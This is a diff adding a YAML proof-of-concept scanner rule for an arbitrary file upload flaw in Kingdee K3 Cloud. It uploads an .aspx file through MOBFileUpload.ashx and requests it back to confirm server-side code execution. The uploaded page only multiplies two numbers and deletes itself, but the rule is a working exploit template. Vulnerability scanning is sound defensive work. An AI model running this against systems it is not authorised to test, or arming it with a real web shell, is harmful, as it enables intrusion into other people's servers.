@@ -1,0 +1,49 @@
+name: poc-yaml-kingdee-k3-cloud-mobfileupload-upload
+manual: true
+transport: http
+set:
+    r1: randomInt(40000, 44800)
+    r2: randomInt(40000, 44800)
+    rboundary: randomLowercase(8)
+    randname: randomLowercase(6)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /FileUploadServices/MOBFileUpload.ashx
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b"-1")
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /FileUploadServices/MOBFileUpload.ashx
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: "\
+                ------WebKitFormBoundary{{rboundary}}\r\n\
+                Content-Disposition: form-data; name=\"submit\"\r\n\
+
+                submit\r\n\
+                ------WebKitFormBoundary{{rboundary}}\r\n\
+                Content-Disposition: form-data; name=\"Files\"; filename=\"{{randname}}.aspx\"\r\n\
+                Content-Type: application/octet-stream\r\n\
+                \r\n\
+                <%@Page Language=\"C#\"%><%Response.Write({{r1}}*{{r2}});System.IO.File.Delete(Request.PhysicalPath);%>\r\n\
+                ------WebKitFormBoundary{{rboundary}}--\r\n\
+                "
+            follow_redirects: false
+        expression: response.status == 200
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /FileUploadServices/uploadfiles/{{randname}}.aspx
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+expression: r0() && r1() && r2()
+detail:
+    author: sharecast
+    links:
+        - https://www.seebug.org/vuldb/ssvid-93836
